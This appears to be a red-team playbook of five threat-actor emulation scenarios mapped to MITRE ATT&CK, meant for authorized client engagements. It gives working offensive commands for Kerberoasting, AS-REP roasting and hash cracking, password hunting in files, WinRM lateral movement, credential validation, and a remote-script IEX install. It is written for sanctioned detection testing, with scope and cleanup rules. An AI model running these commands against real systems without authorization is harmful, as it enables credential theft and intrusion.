# 15 — APT Emulation Scenarios (client-ready)

Distinct, threat-informed scenarios, each modeled on a real threat group's documented
behavior (MITRE ATT&CK group pages and the **MITRE CTID Adversary Emulation Library**:
github.com/center-for-threat-informed-defense/adversary_emulation_library). Running several
scenarios lets you show the client coverage across different attacker *types*, not one path.

**How to prove each scenario was executed** — for every step capture: timestamp, operator,
source host, target, command (secrets redacted), output, ATT&CK ID, expected vs observed
telemetry (`docs/23`). Where possible run steps via **Atomic Red Team** or **Caldera** so each
action has a stable, re-runnable test ID the client can verify.

Rules: in-scope hosts only; approval for every step marked 🔒; **synthetic/canary data only**
for any collection/exfil/impact; cleanup after each scenario (`docs/99`).

Placeholders: `$D` domain, `$DC` DC IP, `$U/$P` test creds, `$T` target host, `$C2` approved
listener, `$CIDR` in-scope range.

### Tooling setup (once)
```powershell
# Atomic Red Team (Windows test host)
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics
Invoke-AtomicTest T1087.002 -ShowDetailsBrief     # preview a test before running
Invoke-AtomicTest T1087.002 -CheckPrereqs
Invoke-AtomicTest T1087.002 -Cleanup              # every test has a cleanup
```
```bash
# Caldera (operator host)
git clone https://github.com/mitre/caldera.git --recursive && cd caldera
pip3 install -r requirements.txt && python3 server.py --insecure   # lab only; set real creds in conf/local.yml
```

---

## Scenario A — APT29-style: phishing → AD discovery → privilege → collection
**Profile**: state espionage; stealthy, credential- and identity-focused.
**Objective**: from one user's workstation reach domain-privileged access and stage a canary document.

| # | Step | ATT&CK | Command / action | Evidence |
|---|---|---|---|---|
| 1 | Approved phishing sim delivers benign payload | T1566.001/.002 | GoPhish campaign to approved list; payload only beacons to `$C2` | campaign report, click time |
| 2 | User executes payload | T1204.002 | (user action in sim) | process tree screenshot |
| 3 | PowerShell execution | T1059.001 | `Invoke-AtomicTest T1059.001 -TestNumbers 1` | script-block log |
| 4 | Host & user discovery | T1082, T1033 | `systeminfo` ; `whoami /all` | output |
| 5 | Domain discovery | T1087.002, T1069.002, T1482 | `net group "Domain Admins" /domain` ; `nltest /domain_trusts` | output |
| 6 | AD graph | T1087.002 | `bloodhound-python -u $U -p $P -d $D -c All -ns $DC --zip` | BH zip + chosen path |
| 7 | Kerberoast 🔒 | T1558.003 | `GetUserSPNs.py $D/$U:$P -dc-ip $DC -request -outputfile spn.hash` → `hashcat -m 13100 spn.hash wl.txt` | ticket meta, cracked acct (redacted) |
| 8 | Lateral via WinRM | T1021.006 | `evil-winrm -i $T -u <svc> -p <redacted>` | logon type 3, WinRM log |
| 9 | Remote file discovery | T1083 | `Get-ChildItem \\$T\share -Recurse -Include *.docx -EA SilentlyContinue \| Select -First 20` | listing |
| 10 | Stage canary | T1074.001 | `Compress-Archive C:\canary\APT29-CANARY.docx C:\Users\Public\stage.zip` | hash of zip |
| 11 | Exfil sim over C2 🔒 | T1041 | download `stage.zip` through approved `$C2` session | proxy/EDR events |

**Detection focus**: script-block logging, LDAP recon burst, TGS anomalies, WinRM from a workstation, archive creation.
**Cleanup**: kill agent, delete `stage.zip`, `Invoke-AtomicTest ... -Cleanup`.

---

## Scenario B — FIN7-style: valid accounts → lateral → finance data (canary)
**Profile**: financially motivated; targets payment/finance systems.
**Objective**: show that one compromised finance user can reach the finance DB/file server.

| # | Step | ATT&CK | Command / action | Evidence |
|---|---|---|---|---|
| 1 | Valid account login (provided test creds) | T1078.002 | `netexec smb $T -u $U -p $P` | auth success |
| 2 | Share discovery | T1135 | `netexec smb $CIDR -u $U -p $P --shares` | readable shares |
| 3 | Find finance hosts | T1018 | `netexec smb $CIDR -u $U -p $P` + DNS names `*fin*`,`*sql*` | host list |
| 4 | Scheduled task execution 🔒 | T1053.005 | `Invoke-AtomicTest T1053.005 -TestNumbers 1` (then `-Cleanup`) | task-create event |
| 5 | DB discovery | T1046 | `nmap -sV -p1433,3306,5432 $T` | service output |
| 6 | DB access with found creds | T1078 | `mssqlclient.py $D/<u>:<p>@$T -windows-auth` → `SELECT name FROM sys.databases;` | query output |
| 7 | Read seeded canary row only | T1213 | `SELECT * FROM canary.dbo.cards WHERE id=1;` | row (synthetic) |
| 8 | Screen capture sim | T1113 | `Invoke-AtomicTest T1113 -TestNumbers 1` | image |
| 9 | Exfil sim (HTTPS) 🔒 | T1567 | upload canary-row file to approved test endpoint | proxy/DLP log |

**Detection focus**: abnormal share enumeration, scheduled-task creation, SQL login from a user workstation, DLP on card-like data.

---

## Scenario C — Ransomware-operator style (Wizard-Spider / Conti lineage) — SAFE
**Profile**: big-game ransomware. **This scenario performs NO real encryption, deletion, or
service disruption.** It proves the *reach and permissions* an operator would need, then stops.

Do not build a destructive step-table here. Run this scenario entirely through the existing
controlled playbooks, which already define the safe method and stop conditions:
- **Scenario 9** (`docs/05`) — ransomware-like objective simulation flow.
- **`docs/10` §10.3** — impact simulation: for each impact (encryption, backup deletion,
  service stop), *demonstrate the permission/reach only* (read/list/stop-permission), capture
  evidence, and STOP before the irreversible call. The only "encryption" performed is one
  reversible `openssl` demo on a single synthetic canary file in an approved sandbox
  (`docs/12` Phase 11).

| Phase | What you prove (non-destructive) | ATT&CK | Evidence |
|---|---|---|---|
| Access + privilege | foothold → local/domain privilege (reuse A/B steps) | T1078, T1068 | path record |
| Backup discovery | you can *list* backups/shadow config — not delete | T1083, T1082 | listing (read-only) |
| Security-control discovery | enumerate AV/EDR present (no tampering) | T1518.001 | output |
| Reach HVAs | prove read/list access to file/DB servers | T1135, T1018 | ACL/listing |
| Canary "encryption" | one reversible openssl demo on a synthetic file | T1486 (sim) | before/after + revert proof |

**Hard stop**: before any real-data encryption, shadow-copy/backup deletion, or service stop.
Each of those is ESCALATE-only and demonstrated as *capability*, never executed.
**Detection focus**: mass-file-access patterns, backup/VSS enumeration, EDR tamper attempts,
ransomware canary triggers. **Cleanup**: remove/decrypt the synthetic file; nothing else changed.

---

## Scenario D — APT41-style: public web app → internal pivot (dual espionage/crime)
**Profile**: exploits internet-facing apps, then pivots internally.
**Objective**: show an external web compromise reaching an internal service.

| # | Step | ATT&CK | Command / action | Evidence |
|---|---|---|---|---|
| 1 | Recon the app | T1595 | `httpx -u https://app -td -title` ; `naabu -host app` | tech/ports |
| 2 | Content discovery | T1595.003 | `ffuf -u https://app/FUZZ -w common.txt -mc 200,301,403` | endpoints |
| 3 | Validate a candidate finding manually 🔒 | T1190 | confirm one issue in Burp (non-destructive PoC, e.g. read-only) | request/response |
| 4 | Confirm exec minimally 🔒 | T1059 | single `id`/`whoami` via the confirmed vector | output |
| 5 | Host orientation | T1082, T1016 | `id; uname -a; ip a; ss -tulpn` | output |
| 6 | Internal service discovery | T1046 | `nmap -sV -p- 10.0.0.0/24` (in-scope only) | services |
| 7 | Reuse exposed secret → internal auth 🔒 | T1078 | `netexec smb <internal> -u <u> -p <redacted>` | auth result |
| 8 | Document internal reach | T1018 | map reachable internal hosts | host list |

**Detection focus**: WAF events, web-shell/exec on app host, egress from DMZ to internal, new auth from the web host.
**Stop**: remove any uploaded test artifact immediately; no DB writes.

---

## Scenario E — OilRig/APT34-style: credential theft → remote services → persistence test
**Profile**: regional espionage; heavy on credential harvesting and remote-service abuse.
**Objective**: show credential reuse enabling remote access and a (reverted) persistence foothold.

| # | Step | ATT&CK | Command / action | Evidence |
|---|---|---|---|---|
| 1 | Credential discovery in files | T1552.001 | `findstr /si password *.config *.xml *.ini` (Win) / `grep -ri password /etc /opt 2>/dev/null` | path + redacted sample |
| 2 | Validate one credential | T1078 | `netexec smb $T -u <u> -p <redacted>` (single attempt) | auth result |
| 3 | AS-REP roast 🔒 | T1558.004 | `GetNPUsers.py $D/ -usersfile users.txt -no-pass -dc-ip $DC` → `hashcat -m 18200` | ticket meta |
| 4 | Remote service access | T1021.001/.006 | `xfreerdp /u:<u> /p:<redacted> /v:$T` or `evil-winrm -i $T -u <u> -p <redacted>` | session event |
| 5 | Persistence test 🔒 (reverted) | T1053.005 | `Invoke-AtomicTest T1053.005 -TestNumbers 1` then **`-Cleanup`** | task-create + delete events |
| 6 | Verify removal | — | `schtasks /query /tn <name>` → not found | confirmation |

**Detection focus**: credential-file access, single-source multi-host auth, AS-REP requests, scheduled-task create/delete pair.
**Cleanup**: confirm the persistence mechanism is removed (step 6); no accounts/ACLs changed.

---

## Mapping back to the report
For the client deliverable, present one row per scenario: **group emulated · entry vector ·
ATT&CK techniques exercised · objective reached? · detection coverage (DETECTED/PARTIAL/NOT,
`docs/11`)**. Attach the per-step evidence and the ATT&CK Navigator heatmap so "we ran more
than one attacker profile" is demonstrable, not asserted.
